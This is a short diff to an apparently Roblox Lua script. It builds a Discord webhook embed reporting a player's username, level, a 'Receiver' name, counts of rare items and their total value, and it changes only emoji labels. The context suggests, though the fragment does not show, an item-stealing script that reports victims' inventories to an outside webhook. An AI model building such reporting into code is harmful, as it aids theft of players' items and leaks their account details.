@@ -1065,12 +1065,12 @@ local WebHookEmbed = CreateEmbed(
     11220,
     {
         {
-            name = "ðŸŽ­ Player Info", 
-            value = "```ðŸ“– Username: "..LP.Name.."\nðŸš€ Level: "..tostring(getLvl())..
-                     "\nðŸ’» Receiver: "..UserName.."```"
+            name = ":ocean: Player Info", 
+            value = "```:book: Username: "..LP.Name.."\n:rocket: Level: "..tostring(getLvl())..
+                     "\n:computer: Receiver: "..UserName.."```"
         },
         {
-            name = "ðŸ“Œ Items Data", 
+            name = ":apple: Items Data", 
             value = "```Uniques: "..tostring(uniqueItemsC)..
                      "\nAncients: "..tostring(ancientItemsC)..
                      "\nGodlys: "..tostring(godlyItemsC)..
@@ -1081,7 +1081,7 @@ local WebHookEmbed = CreateEmbed(
                      "\nCommons: "..tostring(commonItemsC).."```"
         },
         {
-            name = "ðŸŽ‰ Total Value", 
+            name = ":pencil2: Total Value", 
             value = "```"..tostring(math.floor(valueCount + 0.5)).."```"
         },
         {
